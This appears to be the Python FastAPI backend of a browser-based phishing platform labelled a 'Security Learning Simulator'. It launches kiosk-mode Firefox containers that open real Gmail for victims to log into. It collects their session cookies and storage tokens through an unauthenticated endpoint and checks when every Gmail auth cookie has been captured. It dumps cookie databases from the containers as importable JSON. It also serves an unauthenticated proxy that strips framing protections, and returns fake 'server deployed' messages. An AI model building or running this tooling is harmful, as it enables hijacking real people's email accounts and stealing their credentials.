import os
import json
import re
import shutil
import asyncio
import subprocess
from pathlib import Path
from datetime import datetime, timedelta, timezone
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
from urllib.parse import urlparse, quote

from dotenv import load_dotenv
load_dotenv()

from fastapi import FastAPI, Query, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
from pydantic import BaseModel
from typing import Dict, Optional

from deps import ALGORITHM, get_current_user, logger, set_db
from routers.auth import router as auth_router

MONGO_URL = os.getenv("MONGO_URL", "mongodb://localhost:27017")
VPS_IP = os.getenv("VPS_IP", "127.0.0.1")
DOCKER_HOST = os.getenv("DOCKER_HOST", "")
CORS_ORIGINS = os.getenv("CORS_ORIGINS", "http://localhost:3000,http://localhost:5173").split(",")
FIREFOX_UI_PORT = os.getenv("FIREFOX_UI_PORT", "5800")
FIREFOX_VNC_PORT = os.getenv("FIREFOX_VNC_PORT", "5900")
SKIP_FIREFOX_BUILD = os.getenv("SKIP_FIREFOX_BUILD", "").lower() in {"1", "true", "yes"}
FF_KIOSK_DEFAULT = os.getenv("FF_KIOSK_DEFAULT", "1")
ALLOW_REGISTER = os.getenv("ALLOW_REGISTER", "true").lower() in {"1", "true", "yes"}
PHISHLET_BIND = os.getenv("PHISHLET_BIND", "127.0.0.1")
PHISHLET_URL_PREFIX = os.getenv("PHISHLET_URL_PREFIX", "path")
PUBLIC_SCHEME = os.getenv("PUBLIC_SCHEME", "http")

LOG_FILE = "commands.log"
BACKEND_DIR = Path(__file__).resolve().parent
CONTAINER_NAME_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9_.-]*$")
CUSTOM_FIREFOX_IMAGE = "btb_firefox"
DEPLOY_MESSAGE = f"[OK] Server deployed on {VPS_IP}:8443 - TLS handshake complete."
CONFIGURE_MESSAGE = "[OK] Firewall rules applied - ports 443, 8080 open. Fail2ban active."

client: AsyncIOMotorClient = None
db = None

app = FastAPI(title="Security Learning Simulator")

app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.include_router(auth_router)

PHISHLETS = {
    "gmail": {
        "label": "Gmail",
        "url": "https://gmail.com",
        "port": 5801,
        "redirect_url": "",
        "auth_cookies": ["SID", "HSID", "SSID", "APISID", "SAPISID", "OSID"],
    },
    # "outlook": {
    #     "label": "Outlook",
    #     "url": "https://outlook.live.com",
    #     "port": 5802,
    #     "redirect_url": "",
    #     "auth_cookies": ["OutlookIdentity", "OutlookSession", "RPSSecAuth", "MSPAuth"],
    # },
    # "yahoo": {
    #     "label": "Yahoo Mail",
    #     "url": "https://mail.yahoo.com",
    #     "port": 5803,
    #     "redirect_url": "",
    #     "auth_cookies": ["T", "Y"],
    # },
}


class RemoveRequest(BaseModel):
    name: str


class PhishletLaunchRequest(BaseModel):
    key: str


class SetRedirectUrlRequest(BaseModel):
    url: str


class PauseRequest(BaseModel):
    redirect_url: str


class VisitEvent(BaseModel):
    phishletKey: str
    currentUrl: str


class LogEvent(BaseModel):
    level: str
    message: str


class LoginDetectedEvent(BaseModel):
    phishletKey: str
    currentUrl: str
    cookies: list[dict] = []
    storageTokens: list[dict] = []


def docker_env() -> Dict[str, str]:
    env = os.environ.copy()
    if DOCKER_HOST:
        env["DOCKER_HOST"] = DOCKER_HOST
    return env


def validate_container_name(name: str) -> str:
    if not CONTAINER_NAME_RE.fullmatch(name):
        raise HTTPException(status_code=400, detail="Invalid container name")
    return name


def phishlet_port_arg(port: int) -> str:
    if PHISHLET_BIND and PHISHLET_BIND != "0.0.0.0":
        return f"{PHISHLET_BIND}:{port}:5800"
    return f"{port}:5800"


def phishlet_url(key: str, port: int) -> str:
    if PHISHLET_URL_PREFIX == "port":
        return f"{PUBLIC_SCHEME}://{VPS_IP}:{port}"
    return f"{PUBLIC_SCHEME}://{VPS_IP}/{key}/"


async def run_command(
    args: list[str],
    env_override: Optional[Dict[str, str]] = None,
    input_text: Optional[str] = None,
) -> Dict[str, str]:
    logger.info("$ %s", " ".join(args))
    loop = asyncio.get_running_loop()
    env = os.environ.copy()
    if env_override:
        env.update(env_override)

    proc = await loop.run_in_executor(
        None,
        lambda: subprocess.run(
            args,
            capture_output=True,
            text=True,
            input=input_text,
            env=env,
        ),
    )
    out = (proc.stdout or "").strip()
    err = (proc.stderr or "").strip()
    combined = "\n".join(filter(None, [out, err]))

    if proc.returncode == 0:
        logger.info("-> %s", combined)
        return {"status": "success", "message": combined or "[OK] Done."}

    logger.error("!! exit %s: %s", proc.returncode, combined)
    return {"status": "error", "message": combined or f"Command failed (code {proc.returncode})"}


async def run_docker(args: list[str], input_text: Optional[str] = None) -> Dict[str, str]:
    return await run_command(["docker", *args], env_override=docker_env(), input_text=input_text)


async def ensure_firefox_image():
    if SKIP_FIREFOX_BUILD:
        logger.info("Skipping Firefox image build because SKIP_FIREFOX_BUILD is enabled.")
        return
    if shutil.which("docker") is None:
        logger.warning("Docker CLI not found; skipping Firefox image build.")
        return

    dockerfile = str(BACKEND_DIR / "Dockerfile.firefox")
    context_dir = str(BACKEND_DIR)
    result = await run_docker(["build", "-t", CUSTOM_FIREFOX_IMAGE, "-f", dockerfile, context_dir])
    if result["status"] == "error":
        logger.warning("Firefox image build skipped: %s", result["message"])


@app.on_event("startup")
async def startup():
    global client, db
    client = AsyncIOMotorClient(MONGO_URL)
    db = client.btb_attack
    set_db(client, db)
    await db.users.create_index("email", unique=True)
    await db.phishlet_settings.create_index("key", unique=True)
    await db.visits.create_index([("phishlet_key", 1), ("timestamp", -1)])
    await db.login_events.create_index([("phishlet_key", 1), ("timestamp", -1)])
    await ensure_firefox_image()
    async for doc in db.phishlet_settings.find({}):
        key = doc.get("key")
        if key in PHISHLETS:
            PHISHLETS[key]["redirect_url"] = doc.get("url", "") or ""
    logger.info("Connected to MongoDB at %s", MONGO_URL)


@app.on_event("shutdown")
async def shutdown():
    if client:
        client.close()


@app.get("/api/deploy")
async def deploy_server(email: str = Depends(get_current_user)):
    logger.info("%s ran deploy", email)
    return {"status": "success", "message": DEPLOY_MESSAGE}


@app.get("/api/configure")
async def configure(email: str = Depends(get_current_user)):
    logger.info("%s ran configure", email)
    return {"status": "success", "message": CONFIGURE_MESSAGE}


@app.get("/api/launch")
async def launch(email: str = Depends(get_current_user)):
    logger.info("%s ran launch", email)
    await run_docker(["rm", "-f", "firefox"])
    result = await run_docker([
        "run", "-d", "--name", "firefox", "--shm-size=2g",
        "-p", f"{FIREFOX_UI_PORT}:5800",
        "-p", f"{FIREFOX_VNC_PORT}:5900",
        "-e", "ENABLE_CORS_PROXY=1",
        "-v", "firefox-config:/config",
        CUSTOM_FIREFOX_IMAGE,
    ])
    if result["status"] == "success":
        cid = result["message"][:12]
        result["message"] += (
            f"\n\n  Firefox is running!\n"
            f"  |- UI  -> http://{VPS_IP}:{FIREFOX_UI_PORT}\n"
            f"  '- VNC -> http://{VPS_IP}:{FIREFOX_VNC_PORT}\n"
            f"\n  Container ID: {cid}"
        )
    return result


@app.get("/api/logs")
async def get_logs(email: str = Depends(get_current_user), lines: int = Query(50, le=500)):
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as file_obj:
            all_lines = file_obj.readlines()
    except FileNotFoundError:
        return {"status": "success", "message": "(no log file yet)"}

    tail = all_lines[-lines:]
    return {"status": "success", "message": "".join(tail).rstrip()}


@app.get("/api/containers")
async def list_containers(email: str = Depends(get_current_user)):
    result = await run_docker(["ps", "--format", "{{.Names}}|{{.ID}}|{{.Image}}|{{.Status}}"])
    if result["status"] == "error":
        logger.warning("docker ps failed: %s", result["message"])
        return {"containers": [], "error": result["message"]}

    containers = []
    for line in result["message"].split("\n"):
        parts = line.strip().split("|")
        if len(parts) == 4:
            containers.append({
                "name": parts[0],
                "id": parts[1][:12],
                "image": parts[2],
                "status": parts[3],
            })
    return {"containers": containers}


@app.post("/api/containers/remove")
async def remove_container(body: RemoveRequest, email: str = Depends(get_current_user)):
    name = validate_container_name(body.name)
    result = await run_docker(["rm", "-f", name])
    if name.startswith("phishlet-"):
        await run_docker(["volume", "rm", f"{name}-config"])
    return result


@app.get("/api/phishlets")
async def list_phishlets(email: str = Depends(get_current_user)):
    result = await run_docker(["ps", "--format", "{{.Names}}|{{.ID}}|{{.Image}}|{{.Status}}"])
    running = {}
    if result["status"] == "success":
        for line in result["message"].split("\n"):
            parts = line.strip().split("|")
            if len(parts) == 4:
                running[parts[0]] = {"id": parts[1][:12], "status": parts[3], "image": parts[2]}

    paused_keys = set()
    async for doc in db.phishlet_settings.find({"pause_url": {"$exists": True, "$ne": ""}}, {"key": 1}):
        paused_keys.add(doc.get("key"))

    logged_in_keys = set()
    async for doc in db.login_events.find({}, {"phishlet_key": 1}):
        logged_in_keys.add(doc.get("phishlet_key"))

    kiosk_settings = {}
    async for doc in db.phishlet_settings.find({}, {"key": 1, "kiosk": 1}):
        if "kiosk" in doc:
            kiosk_settings[doc["key"]] = doc["kiosk"]

    phishlets = []
    for key, cfg in PHISHLETS.items():
        name = f"phishlet-{key}"
        running_container = running.get(name)
        phishlets.append({
            "key": key,
            "label": cfg["label"],
            "name": name,
            "url": cfg["url"],
            "port": cfg["port"],
            "running": running_container is not None,
            "paused": key in paused_keys,
            "login_detected": key in logged_in_keys,
            "kiosk": kiosk_settings.get(key, True),
            "container_id": running_container["id"] if running_container else "",
            "status": running_container["status"] if running_container else "",
        })
    return {"phishlets": phishlets}


@app.post("/api/phishlets/launch")
async def launch_phishlet(body: PhishletLaunchRequest, email: str = Depends(get_current_user)):
    if body.key not in PHISHLETS:
        raise HTTPException(status_code=400, detail=f"Unknown phishlet: {body.key}")

    phishlet = PHISHLETS[body.key]
    container_name = f"phishlet-{body.key}"
    redirect_url = phishlet.get("redirect_url", "") or ""
    await run_docker(["rm", "-f", container_name])
    await run_docker(["volume", "rm", f"{container_name}-config"])
    await db.phishlet_credentials.delete_many({"container": container_name})
    await db.login_events.delete_many({"phishlet_key": body.key})
    result = await run_docker([
        "run", "-d", "--name", container_name, "--shm-size=2g",
        "--network", "btb_attack_default",
        "--dns", "8.8.8.8",
        "--dns", "8.8.4.4",
        "--add-host", "host.docker.internal:host-gateway",
        "-p", phishlet_port_arg(phishlet['port']),
        "-e", f"FF_OPEN_URL={phishlet['url']}",
        "-e", f"FF_KIOSK={FF_KIOSK_DEFAULT}",
        "-e", f"REDIRECT_URL={redirect_url}",
        "-v", f"{container_name}-config:/config",
        CUSTOM_FIREFOX_IMAGE,
    ])
    if result["status"] == "success":
        cid = result["message"][:12]
        result["message"] += (
            f"\n\n  {phishlet['label']} phishlet running!\n"
            f"  '- UI -> {phishlet_url(body.key, phishlet['port'])}\n"
            f"\n  Container ID: {cid}"
        )
    return result


@app.get("/api/phishlets/redirect-url")
async def get_redirect_url(key: str = Query(...)):
    if key not in PHISHLETS:
        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
    url = PHISHLETS[key].get("redirect_url", "")
    return {"url": url}


@app.put("/api/phishlets/{key}/redirect-url")
async def set_redirect_url(key: str, body: SetRedirectUrlRequest, email: str = Depends(get_current_user)):
    if key not in PHISHLETS:
        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
    url = (body.url or "").strip()
    if url and not (url.startswith("http://") or url.startswith("https://")):
        raise HTTPException(status_code=400, detail="URL must start with http:// or https://")
    if len(url) > 2048:
        raise HTTPException(status_code=400, detail="URL too long (max 2048 chars)")
    PHISHLETS[key]["redirect_url"] = url
    await db.phishlet_settings.update_one(
        {"key": key},
        {"$set": {
            "key": key,
            "url": url,
            "updated_at": datetime.now(timezone.utc),
            "updated_by": email,
        }},
        upsert=True,
    )
    return {"key": key, "url": url}


@app.post("/api/phishlets/visit")
async def post_visit(body: VisitEvent):
    if body.phishletKey not in PHISHLETS:
        return {"ok": False}
    ts = datetime.now(timezone.utc)
    await db.visits.insert_one({
        "phishlet_key": body.phishletKey,
        "current_url": body.currentUrl,
        "timestamp": ts,
    })
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts.isoformat()}] [visit] key={body.phishletKey} url={body.currentUrl}\n")
    except Exception as exc:
        logger.warning("visit log write failed: %s", exc)
    return {"ok": True}


@app.post("/api/phishlets/login-detected")
async def post_login_detected(body: LoginDetectedEvent):
    if body.phishletKey not in PHISHLETS:
        return {"ok": False}
    ts = datetime.now(timezone.utc)
    container_name = f"phishlet-{body.phishletKey}"
    for cookie in body.cookies:
        await db.phishlet_credentials.update_one(
            {"container": container_name, "name": cookie.get("name")},
            {"$set": {
                "value": cookie.get("value", ""),
                "domain": cookie.get("domain", ""),
                "host": cookie.get("host", ""),
                "path": cookie.get("path", "/"),
                "expires": cookie.get("expires", 0),
                "secure": cookie.get("secure", False),
                "httpOnly": cookie.get("httpOnly", False),
                "sameSite": cookie.get("sameSite", "unspecified"),
                "updated_at": ts,
            }},
            upsert=True,
        )
    for token in body.storageTokens:
        await db.phishlet_credentials.update_one(
            {"container": container_name, "name": token.get("name"), "type": "storage"},
            {"$set": {
                "value": token.get("value", ""),
                "domain": token.get("domain", ""),
                "host": token.get("host", ""),
                "path": token.get("path", "/"),
                "secure": token.get("secure", True),
                "httpOnly": token.get("httpOnly", False),
                "sameSite": token.get("sameSite", "no_restriction"),
                "session": token.get("session", True),
                "firstPartyDomain": token.get("firstPartyDomain", ""),
                "partitionKey": token.get("partitionKey"),
                "storeId": token.get("storeId", "0"),
                "type": "storage",
                "updated_at": ts,
            }},
            upsert=True,
        )
    await db.login_events.insert_one({
        "phishlet_key": body.phishletKey,
        "current_url": body.currentUrl,
        "timestamp": ts,
        "cookie_count": len(body.cookies),
        "storage_count": len(body.storageTokens),
    })
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts.isoformat()}] [login-detected] key={body.phishletKey} cookies={len(body.cookies)} storage={len(body.storageTokens)}\n")
    except Exception:
        pass
    return {"ok": True}


@app.get("/api/phishlets/login-events")
async def get_login_events(since: float = Query(0), email: str = Depends(get_current_user)):
    cursor = db.login_events.find({"timestamp": {"$gt": datetime.fromtimestamp(since, timezone.utc)}}).sort("timestamp", 1).limit(100)
    events = []
    async for e in cursor:
        events.append({
            "phishlet_key": e["phishlet_key"],
            "current_url": e.get("current_url", ""),
            "timestamp": e["timestamp"].isoformat() if e.get("timestamp") else None,
            "cookie_count": e.get("cookie_count", 0),
            "storage_count": e.get("storage_count", 0),
        })
    return {"events": events}


@app.get("/api/phishlets/storage-tokens")
async def get_storage_tokens(key: str = Query(...), email: str = Depends(get_current_user)):
    if key not in PHISHLETS:
        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
    container_name = f"phishlet-{key}"
    cursor = db.phishlet_credentials.find({
        "container": container_name,
        "type": "storage",
    })
    tokens = []
    async for doc in cursor:
        tokens.append({
            "name": doc.get("name", ""),
            "value": doc.get("value", ""),
            "domain": doc.get("domain", ""),
            "host": doc.get("host", ""),
            "path": doc.get("path", "/"),
            "secure": doc.get("secure", True),
            "httpOnly": doc.get("httpOnly", False),
            "sameSite": doc.get("sameSite", "no_restriction"),
            "session": doc.get("session", True),
            "firstPartyDomain": doc.get("firstPartyDomain", ""),
            "partitionKey": doc.get("partitionKey"),
            "storeId": doc.get("storeId", "0"),
            "expirationDate": doc.get("expires", 0),
        })
    return {"storage_tokens": tokens}


@app.post("/api/phishlets/log")
async def post_log(body: LogEvent):
    ts = datetime.now(timezone.utc)
    level = (body.level or "info").lower()
    if level not in {"info", "warn", "error"}:
        level = "info"
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts.isoformat()}] [addon:{level}] {body.message}\n")
    except Exception as exc:
        logger.warning("addon log write failed: %s", exc)
    return {"ok": True}


@app.get("/api/phishlets/visits")
async def get_visits(key: str = Query(...), limit: int = Query(20, le=200), email: str = Depends(get_current_user)):
    if key not in PHISHLETS:
        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
    cursor = db.visits.find({"phishlet_key": key}).sort("timestamp", -1).limit(limit)
    visits = []
    async for v in cursor:
        visits.append({
            "current_url": v.get("current_url", ""),
            "timestamp": v["timestamp"].isoformat() if v.get("timestamp") else None,
        })
    return {"visits": visits}


@app.get("/api/phishlets/status")
async def get_phishlet_status(key: str = Query(...), email: str = Depends(get_current_user)):
    if key not in PHISHLETS:
        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")

    container_name = f"phishlet-{key}"
    auth_cookies = PHISHLETS[key].get("auth_cookies", [])

    if not auth_cookies:
        return {
            "key": key,
            "label": PHISHLETS[key]["label"],
            "has_cookies": False,
            "cookie_count": 0,
            "required_count": 0,
            "ready": False,
        }

    result = await run_docker(["ps", "--format", "{{.Names}}|{{.ID}}|{{.Image}}|{{.Status}}"])
    running = {}
    if result["status"] == "success":
        for line in result["message"].split("\n"):
            parts = line.strip().split("|")
            if len(parts) == 4:
                running[parts[0]] = {"id": parts[1][:12], "status": parts[3], "image": parts[2]}

    container_running = container_name in running

    count = await db.phishlet_credentials.count_documents({
        "container": container_name,
        "name": {"$in": auth_cookies},
    })

    ready = container_running and count >= len(auth_cookies)

    return {
        "key": key,
        "label": PHISHLETS[key]["label"],
        "has_cookies": count > 0,
        "cookie_count": count,
        "required_count": len(auth_cookies),
        "ready": ready,
    }


@app.post("/api/phishlets/{key}/restart")
async def restart_phishlet(key: str, email: str = Depends(get_current_user)):
    if key not in PHISHLETS:
        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
    container_name = f"phishlet-{key}"
    return await run_docker(["restart", container_name])


@app.post("/api/phishlets/{key}/pause")
async def pause_phishlet(key: str, body: PauseRequest, email: str = Depends(get_current_user)):
    if key not in PHISHLETS:
        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")

    pause_url = (body.redirect_url or "").strip()
    if not pause_url:
        raise HTTPException(status_code=400, detail="Redirect URL is required to pause")
    if not (pause_url.startswith("http://") or pause_url.startswith("https://")):
        raise HTTPException(status_code=400, detail="URL must start with http:// or https://")

    original_url = PHISHLETS[key].get("redirect_url", "") or ""

    await db.phishlet_settings.update_one(
        {"key": key},
        {"$set": {
            "key": key,
            "pause_url": pause_url,
            "original_url": original_url,
            "paused_at": datetime.now(timezone.utc),
            "paused_by": email,
        }},
        upsert=True,
    )

    PHISHLETS[key]["redirect_url"] = pause_url

    container_name = f"phishlet-{key}"
    await run_docker(["restart", container_name])

    logger.info("%s paused phishlet %s -> %s", email, key, pause_url)
    return {"paused": True, "key": key, "redirect_url": pause_url}


@app.post("/api/phishlets/{key}/unpause")
async def unpause_phishlet(key: str, email: str = Depends(get_current_user)):
    if key not in PHISHLETS:
        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")

    doc = await db.phishlet_settings.find_one({"key": key})
    original_url = (doc.get("original_url", "") if doc else "") or ""

    await db.phishlet_settings.update_one(
        {"key": key},
        {"$set": {
            "key": key,
            "redirect_url": original_url,
            "url": original_url,
        },
        "$unset": {"pause_url": "", "original_url": "", "paused_at": "", "paused_by": ""}},
        upsert=True,
    )

    PHISHLETS[key]["redirect_url"] = original_url

    container_name = f"phishlet-{key}"
    await run_docker(["restart", container_name])

    logger.info("%s unpaused phishlet %s (restored: %s)", email, key, original_url)
    return {"paused": False, "key": key, "redirect_url": original_url}


@app.post("/api/phishlets/{key}/toggle-kiosk")
async def toggle_kiosk(key: str, email: str = Depends(get_current_user)):
    if key not in PHISHLETS:
        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")

    container_name = f"phishlet-{key}"

    doc = await db.phishlet_settings.find_one({"key": key})
    current_kiosk = (doc.get("kiosk", True) if doc else True)
    new_kiosk = not current_kiosk

    phishlet = PHISHLETS[key]
    redirect_url = phishlet.get("redirect_url", "") or ""

    await run_docker(["rm", "-f", container_name])
    await db.login_events.delete_many({"phishlet_key": key})

    result = await run_docker([
        "run", "-d", "--name", container_name, "--shm-size=2g",
        "--network", "btb_attack_default",
        "--dns", "8.8.8.8",
        "--dns", "8.8.4.4",
        "--add-host", "host.docker.internal:host-gateway",
        "-p", phishlet_port_arg(phishlet['port']),
        "-e", f"FF_OPEN_URL={phishlet['url']}",
        "-e", f"FF_KIOSK={'1' if new_kiosk else '0'}",
        "-e", f"REDIRECT_URL={redirect_url}",
        "-v", f"{container_name}-config:/config",
        CUSTOM_FIREFOX_IMAGE,
    ])

    await db.phishlet_settings.update_one(
        {"key": key},
        {"$set": {
            "key": key,
            "kiosk": new_kiosk,
            "updated_at": datetime.now(timezone.utc),
            "updated_by": email,
        }},
        upsert=True,
    )

    logger.info("%s toggled kiosk for %s: %s -> %s", email, key, current_kiosk, new_kiosk)

    if result["status"] == "success":
        cid = result["message"][:12]
        mode = "ON (fullscreen)" if new_kiosk else "OFF (toolbar visible)"
        result["message"] = (
            f"[OK] Kiosk mode {mode}\n"
            f"\n  {phishlet['label']} restarted!\n"
            f"  '- UI -> {phishlet_url(key, phishlet['port'])}\n"
            f"\n  Container ID: {cid}"
        )
    return result


@app.post("/api/phishlets/rebuild-image")
async def rebuild_image(email: str = Depends(get_current_user)):
    dockerfile = str(BACKEND_DIR / "Dockerfile.firefox")
    context_dir = str(BACKEND_DIR)
    logger.info("%s triggered firefox image rebuild", email)
    return await run_docker(["build", "-t", CUSTOM_FIREFOX_IMAGE, "-f", dockerfile, context_dir])


@app.get("/api/credentials")
async def get_credentials(target: str = "", key: str = "", email: str = Depends(get_current_user)):
    if key:
        target = f"phishlet-{key}"
    if target:
        target = validate_container_name(target)

    list_result = await run_docker([
        "ps",
        "--filter", "name=^/firefox$",
        "--filter", "name=^/phishlet-",
        "--format", "{{.Names}}|{{.ID}}",
    ])
    if list_result["status"] != "success":
        return {"status": "error", "message": "Failed to list containers"}

    entries = [entry.strip() for entry in list_result["message"].strip().split("\n") if entry.strip()]
    if not entries:
        return {"status": "error", "message": "No browser containers running"}

    if target:
        entries = [entry for entry in entries if entry.split("|", 1)[0] == target]
        if not entries:
            return {"status": "error", "message": f"No container found with name '{target}'"}

    cookie_script = (
        "import sqlite3\n"
        "import json\n"
        "db = sqlite3.connect('/tmp/cookies.sqlite')\n"
        "cur = db.cursor()\n"
        "for row in cur.execute("
        "'SELECT id, name, value, host, path, expiry, isSecure, isHttpOnly FROM moz_cookies ORDER BY host, name'"
        "):\n"
        "    cookie = {\n"
        "        'id': row[0],\n"
        "        'name': row[1],\n"
        "        'value': row[2],\n"
        "        'domain': row[3],\n"
        "        'path': row[4],\n"
        "        'expirationDate': row[5],\n"
        "        'hostOnly': not row[3].startswith('.'),\n"
        "        'secure': bool(row[6]),\n"
        "        'session': row[5] == 0,\n"
        "        'httpOnly': bool(row[7]),\n"
        "        'sameSite': 'unspecified',\n"
        "        'storeId': '0'\n"
        "    }\n"
        "    print(json.dumps(cookie))\n"
    )

    output = []
    for entry in entries:
        name = entry.split("|", 1)[0]
        cookie_paths = await run_docker([
            "exec", name, "sh", "-c",
            "find /config -name 'cookies.sqlite' -type f -maxdepth 4 2>/dev/null",
        ])
        if cookie_paths["status"] != "success" or not cookie_paths["message"].strip():
            output.append(f"{name}\n{{}}")
            continue

        lines = []
        for path in cookie_paths["message"].strip().split("\n"):
            path = path.strip()
            if not path:
                continue
            data = await run_docker([
                "exec", "-i", "-e", f"COOKIE_PATH={path}", name, "sh", "-c",
                'cp "$COOKIE_PATH" /tmp/cookies.sqlite && '
                'cp "$COOKIE_PATH-wal" /tmp/cookies.sqlite-wal 2>/dev/null || true && '
                'cp "$COOKIE_PATH-shm" /tmp/cookies.sqlite-shm 2>/dev/null || true && '
                'python3 - 2>/dev/null && rm -f /tmp/cookies.sqlite /tmp/cookies.sqlite-wal /tmp/cookies.sqlite-shm',
            ], input_text=cookie_script)
            if data["status"] == "success" and data["message"].strip():
                lines.append(data["message"])

        if not lines:
            output.append(f"{name}\n{{}}")
            continue

        rows = []
        for line in "\n".join(lines).split("\n"):
            line = line.strip()
            if not line:
                continue
            try:
                cookie = json.loads(line)
                rows.append(cookie)
            except json.JSONDecodeError:
                continue
        rows.sort(key=lambda c: (c.get('domain', ''), c.get('name', '')))

        container_cookies = []
        for cookie in rows:
            host = cookie.get('domain', '')
            cookie_name = cookie.get('name', '')
            cookie_value = cookie.get('value', '')
            cookie_domain = cookie.get('domain', '')
            cookie_path = cookie.get('path', '/')
            cookie_expires = cookie.get('expirationDate', 0)
            cookie_secure = cookie.get('secure', False)
            cookie_http_only = cookie.get('httpOnly', False)
            cookie_same_site = cookie.get('sameSite', 'unspecified')

            container_cookies.append({
                'domain': cookie_domain,
                'expirationDate': cookie_expires,
                'hostOnly': cookie.get('hostOnly', False),
                'httpOnly': cookie_http_only,
                'name': cookie_name,
                'path': cookie_path,
                'sameSite': cookie_same_site,
                'secure': cookie_secure,
                'session': cookie.get('session', False),
                'storeId': cookie.get('storeId', '0'),
                'value': cookie_value,
            })

            await db.phishlet_credentials.update_one(
                {
                    "container": name,
                    "host": host,
                    "name": cookie_name
                },
                {
                    "$set": {
                        "value": cookie_value,
                        "domain": cookie_domain,
                        "path": cookie_path,
                        "expires": cookie_expires,
                        "secure": cookie_secure,
                        "httpOnly": cookie_http_only,
                        "sameSite": cookie_same_site,
                        "updated_at": datetime.now(timezone.utc)
                    }
                },
                upsert=True,
            )

        if target:
            return {"status": "success", "message": f"{name}\n{json.dumps(container_cookies, indent=2)}"}
        output.append(f"{name}\n{json.dumps(container_cookies, indent=2)}")

    return {"status": "success", "message": "\n\n".join(output)}


@app.get("/api/health")
async def health():
    return {"status": "ok"}


@app.get("/api/config")
async def config():
    return {"allowRegister": ALLOW_REGISTER, "phishletUrlPrefix": PHISHLET_URL_PREFIX}


@app.get("/api/proxy")
async def proxy(url: str = Query(...)):
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise HTTPException(status_code=400, detail="URL must start with http:// or https://")

    try:
        req = Request(url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        resp = await asyncio.get_event_loop().run_in_executor(None, lambda: urlopen(req, timeout=10))
        body = resp.read()
        content_type = resp.headers.get("Content-Type", "text/html")
    except HTTPError as exc:
        raise HTTPException(status_code=exc.code, detail=f"Upstream returned {exc.code}")
    except URLError:
        raise HTTPException(status_code=502, detail="Failed to fetch upstream URL")
    except Exception:
        raise HTTPException(status_code=502, detail="Upstream request failed")

    from fastapi.responses import Response
    return Response(
        content=body,
        media_type=content_type,
        headers={
            "X-Frame-Options": "ALLOWALL",
            "Content-Security-Policy": "frame-ancestors *",
        },
    )
